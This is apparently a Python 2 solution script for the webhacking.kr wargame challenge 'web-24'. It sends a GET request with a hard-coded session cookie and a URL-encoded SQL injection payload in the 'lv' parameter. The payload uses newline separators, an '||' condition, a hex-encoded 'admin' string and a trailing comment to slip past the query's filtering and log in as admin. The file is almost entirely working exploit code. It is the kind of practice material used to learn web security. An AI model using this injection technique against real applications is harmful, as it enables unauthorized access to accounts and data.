import requests

url='http://webhacking.kr/challenge/web/web-24/index.php?lv='
cookies={'PHPSESSID':'op8vkt8cl93corgrj5krjo7g93'}
lv='2%0a||%0aid%0alike%0a0x61646d696e#'
url=url+lv
response=requests.get(url,cookies=cookies)#,params=param)
#response=requests.post(url,cookies=cookies)

print response.text
